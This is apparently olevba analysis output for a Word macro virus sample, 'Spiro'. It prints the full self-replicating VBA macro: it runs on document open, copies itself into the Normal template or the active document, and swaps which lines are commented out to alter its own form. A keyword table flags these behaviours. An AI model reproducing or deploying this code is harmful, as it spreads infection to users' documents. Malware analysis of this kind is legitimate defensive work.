olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Spiro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Spiro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Private Sub Document_Open()
On Error Resume Next
'On Error Resume Next
Set vHost = ThisDocument.VBProject.VBComponents(1).CodeModule
'Set v235234 = ThisDocument.VBProject.VBComponents(1).CodeModule
vkod = vHost.Lines(1, vHost.CountOfLines)
'k092345 = v235234.Lines(1, v235234.CountOfLines)
If ThisDocument = ActiveDocument Then Set t759823 = NormalTemplate Else Set t759823 = ActiveDocument
'If ThisDocument = ActiveDocument Then Set h759823 = NormalTemplate Else Set h759823 = ActiveDocument
If t759823.VBProject.VBComponents(1).CodeModule.CountOfLines <> 49 Then
'Set f785109 = h759823.VBProject.VBComponents(1).CodeModule
With t759823.VBProject.VBComponents(1).CodeModule
'If f785109.CountOfLines <> 49 Then
.deletelines 1, .CountOfLines
'With f785109
.addfromstring vkod
'.deletelines 1, .CountOfLines: .addfromstring k092345
End With
'End With
t759823.VBProject.Description = "WM.Spiroheta"
'h759823.VBProject.Description = "WM.Spiroheta": End If
End If
'For t234566 = 1 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
For a = 2 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
'n096583 = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(t234566, 1)
naskod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(a, 1)
'If Left(n096583, 1) = "'" Then
If Left(naskod, 1) = "'" Then
'd099874 = Right(n096583, Len(n096583) - 1)
desni = Right(naskod, Len(naskod) - 1)
'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine t234566, d099874
ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine a, desni
'End If
End If
'd099874 = ""
desni = ""
'Next
Next
'For g650235 = 2 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
For t = 1 To ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Step 2
'j719579 = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(g650235, 1)
naskod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(t, 1)
'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine g650235, "'" & j719579
ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine t, "'" & naskod
'Next
Next
'End Sub
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

